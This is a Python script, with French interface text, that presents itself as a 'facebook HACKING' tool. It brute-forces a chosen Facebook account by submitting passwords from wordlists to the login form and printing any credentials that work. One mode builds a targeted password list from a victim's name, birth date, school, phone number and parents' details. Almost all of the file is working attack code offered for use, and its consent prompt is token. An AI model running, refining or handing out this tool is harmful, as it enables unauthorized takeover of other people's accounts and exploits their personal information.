#coding:utf-8
# Coding by Hackylu'x Fondateur of InformaTutos 
import sys, time, os
def login_hack(phrase):
    time.sleep(2)
    os.system("clear")
    for dire in phrase + '\n':
        sys.stdout.write(dire)
        sys.stdout.flush()
        time.sleep(10./100)

if sys.platform in ["linux", "linux2"] :
    R = "\033[31;1m"
    V = "\033[32;1m"
    B = "\033[0m"
    C = "\033[36;1m"
    J = '\033[93m'
    M = '\033[94m'
else :
    R = ""
    V = ""
    B = ""
    c = ""
    J = ""
    M = ""

if sys.version[0] == '3' :
    pass
else:
    V = "\033[32;1m"
    print("Programme uniquement éxécutable sous Python3 ex : "+V+"Taper Python3 fbhack.py")
    sys.exit()
try :
    import requests, mechanicalsoup
except :
    print("Module manquant ")
    print("Installer les modules avec la commande 'pip3 install -r required.txt'")
    sys.exit()

os.system("clear")
print(B+"[*]-Vérification de la connexion internet "+B)
time.sleep(2)
try :
    conxion = requests.get("https://www.google.com/")
except :
    print(R+"[!!]-Vous n'etes pas connecté à internet "+B)
    time.sleep(3)
    sys.exit()
try :
    if conxion :
        try :
            print(V+"[']-Connecté !"+B)
            warning = R+"En utilisant ce programme vous acceptez à respecter les droits autruis : [utilisateurs]"+B
            login_hack(warning)
            print(J+"Acceptez vous cette recommendation ? ")
            agree = input("Oui / Non ------> ")
            if agree in ["oui", "Oui", "OUI"] :
                pass
            elif agree in ["Non", "non", "NON"] :
                print(V+"Programme fermé ! ")
                sys.exit()
            else :
                print(R+"Réponse invalide ! Relancer le programme !")
                sys.exit()
        except :
            sys.exit()
except :
    sys.exit()
def banier() :
    os.system("clear")
    print(C+"""
===============================================
    __                _                 _    
   / _| __ _  ___ ___| |__   ___   ___ | | __
  | |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
  |  _| (_| | (_|  __/ |_) | (_) | (_) |   < 
  |_|  \__,_|\___\___|_.__/ \___/ \___/|_"""+R+"""HACKING"""+C+"""
================================================                                                     
    """+V+"""        ---Le Programme est à but lucratif---"""+B+
    """     
        -------------------    
        Coding by Hackylu'x \n"""+R+
    """
                        FONDATEUR DE INFORMATUTOS
                        -------------------------
    """+B)
def help_mp() :
    os.system("clear")
    print(J+"""
        #----------COMMANDES USUELLES---------#
        ---------------------------------------
        #    [1] => Mode Par Défaut           #
        #    [2] => Mode Manuelle             #
        #    [3] => Mode Générer              #
        #    [4] => Quitter                   #
        #-------------------------------------#
    """+B)
def attaque (passwd_victime, id_victime):
    navigateur = mechanicalsoup.StatefulBrowser()
    try :
        navigateur.open("https://web.facebook.com/login.php?login_attempt=1&_rdc=1&_rdr")
    except :
        print(R+"[!]-Problème de connexion au serveur"+B)
        sys.exit()
    form_get = navigateur.select_form()
    victime_inf = []
    if form_get :
        navigateur["email"] = id_victime     
        navigateur["pass"] = passwd_victime
        navigateur.submit_selected()
        victime = navigateur.get_current_page().find_all("a")
        for key in victime :
            log_victime = key.get("href")
            victime_inf.append(log_victime)
    if "https://web.facebook.com/{}".format(id_victime) in victime_inf :
        trouv = V+"[:]- Mot de Passe  Trouvé ...........................  !! [:]"+B
        login_hack(trouv)
        info = C+"Utiliser les Informations suivantes Pour la connection au Compte Facebook ---> "
        login_hack(info)
        print(B+"===================================="+ '\n' + V+"Indentifiant   ::: "+J+id_victime + '\n' + V+ "Mot de Passe ::: "+J+passwd_victime+B+'\n'+"====================================")
        sys.exit() 
def fb_h(log) :
    try :
        fichier = open(log, "r")
    except :
        print(R+"[*]-Le Fichier Mot de Passe est introuvable "+B)
    id_victime = str(input(M+"Entrer l'id du compte Facebook "+B))
    count = 0
    for i in fichier :
        passwd_victime = i.strip("\n")
        count +=1
        count_ = len(range(count)) 
        print(J+"[*]-Tentative "+B+R+"{}".format(count_)+B+" avec "+M+"{}".format(passwd_victime))
        attaque (passwd_victime, id_victime)
    print(R+"Aucun Mot de Passe ne Correspond à L'Identifiant ", V+id_victime)
def defaut_mp() :
    defau = C+"[!] Initialisation pour l'usage des mots de passe par defaut "+B
    login_hack(defau)
    try :
        fichier = open("defaut_mp.txt")
    except :
        print(R+"[*] Fichier manquant ! "+B)
        sys.exit()
    if fichier:
        log = "defaut_mp.txt"
        fb_h(log)
def nouveau_mp() :
    print("[?]-Entrer les mots de passe ! \n")
    print(R+"NB : Taper 'Facebook' pour marquer la fin !\n"+B)
    try :
        fichier = open("nouveau_mp.txt", "a")
    except :
        print(R+"[!]-Impossible de creer le fichier !"+B)
        sys.exit()
    i = 0
    pass_log = []
    while True:
        i += 1
        log_pass = input("")
        pass_log.append(log_pass)
        print(V+"[*] Vous avez creé "+R+"{}".format(i)+V+" Nouveau(x) mot de passe  "+B)
        if log_pass in ["Facebook", "facebook"] :
            break
    for ii in range(len(pass_log))  :
        fichier.writelines(pass_log[ii]+"\n") 
def ask_gen() :
    print(V+"Voulez-vous affiché les mots de Passe ? "+B)
    quiz = input(C+"Y|N ou y|n "+B)
    if quiz in ["Y", "y"]:
        fichier = open("generer_mp.txt", "r")
        lire = fichier.readlines()
        line = "".join(lire)
        print(line)
        time.sleep(2)
        os.system("clear")
        log = "generer_mp.txt"
        fb_h(log)
    elif quiz in ["N", "n"]:
        log = "generer_mp.txt"
        fb_h(log)
    else :
        print(R+"Entrer invalide "+B)
        ask_gen()
def generer_mp() :
    gener = J+"[!]- Entrer les informations suivantes concernants la victime \n"+B
    login_hack(gener)
    print("Taper entrer si vous ne connaisez pas un champs !")
    time.sleep(2)
    inf = []
    inf1 = input(V+"Nom ? "+B)
    inf.append(inf1)
    inf2 = input(V+"Prénom ? "+B)
    inf.append(inf2)
    inf3 = input(V+"Date de naissance ex : 08-04-2009 ? "+B)
    inf.append(inf3)
    inf4 = input(V+"College/université/ecole/ceg/lycé ? "+B)
    inf.append(inf4)
    inf5 = input(V+"Numero ? "+B)
    inf.append(inf5)
    print('')
    inf6 = input(V+"Nom père ? "+B)
    inf.append(inf6)
    inf7 = input(V+"Prénom père ? "+B)
    inf.append(inf7)
    inf8 = input(V+"Date de naissance ? "+B)
    inf.append(inf8)
    inf9 = input(V+"Numéro ? "+B)
    inf.append(inf9)
    print('')
    inf10 = input(V+"Nom mère ? "+B)
    inf.append(inf10)
    inf11 = input(V+"Prénom mère ? "+B)
    inf.append(inf11)
    inf12 = input(V+"Date de naissance ex : 07-02-2011? "+B)
    inf.append(inf12)
    inf13 = input(V+"Numéro ? "+B)
    inf.append(inf13)
    os.system("clear")
    print(C+"[!]- Génération de mot de passe en cours ......."+B)
    print('')
    time.sleep(2)
    try :
        fichier = open("generer_mp.txt", "a")
    except :
        pass
    for i in range(len(inf)) :
        pas1 = inf[i] + inf[i-1]
        fichier.writelines(pas1+"\n")
        pas2 = inf[i] + inf[i-2]
        fichier.writelines(pas2+"\n")
        pas3 = inf[i] + inf[1]
        fichier.writelines(pas3+"\n")
        pas4 = inf[i] + inf[0]
        fichier.writelines(pas4+"\n")
        pas5 = inf[i] + inf[2]
        fichier.writelines(pas5+"\n")
        pas7 = inf[i] + inf[3]
        fichier.writelines(pas7+"\n")
        pas6 = inf[i] + inf[4]
        fichier.writelines(pas6+"\n")
        pas8 = inf[i] + inf[5]
        fichier.writelines(pas8+"\n")
        pas9 = inf[i] + inf[6]
        fichier.writelines(pas9+"\n")
        pas10 = inf[i] + inf[7]
        fichier.writelines(pas10+"\n")
        pas11 = inf[i] + inf[8]
        fichier.writelines(pas11+"\n")
        pas12 = inf[i] + inf[9]
        fichier.writelines(pas12+"\n")
        pas13 = inf[i] + inf[10]
        fichier.writelines(pas13+"\n")
        pas14 = inf[i] + inf[11]
        fichier.writelines(pas14+"\n")
        pas15 = inf[i] + inf[12]
        fichier.writelines(pas15+"\n")  
    fichier.close() 
    print(V+"[!]- Génération de mot de passe Finish ......."+B)
    time.sleep(2)
    os.system("clear")
    ask_gen()
def fbhack_mp() :
    fbh = input(B+"--><-- "+M)
    try :
        fbh =  int(fbh)
    except :
        print(R+"[*]-Entrer une valeur numérique ! "+B)
        time.sleep(2)
        fbhack_mp()
    if fbh == 1 :
        defaut_mp()
    elif fbh == 2 :
        nouveau_mp()
        fb_h(log = "nouveau_mp.txt")
    elif fbh == 3 :
        generer_mp()
    elif fbh == 4 :
        time.sleep(2)
        print(V+"BYE"+B)
        sys.exit()
    else :
        print(R+"[!]-Entrer invalide !"+B)
        time.sleep(2)
        fbhack_mp()
    
def main_mp() :
    time.sleep(2)
    banier()
    time.sleep(1)
    hlp = input(B+"[*]-Taper Usage ! "+B)
    if hlp in ["Usage", "usage"] :
        help_mp()
        fbhack_mp()
    elif hlp == "":
        main_mp()
    elif hlp in ["exit", "Exit"] :
        sys.exit()
    else :
        print(R+"Commande"+B+ " {}".format(hlp)+R+" Introuvable"+B)
        time.sleep(2)
        main_mp()
#main_mp()
banier()
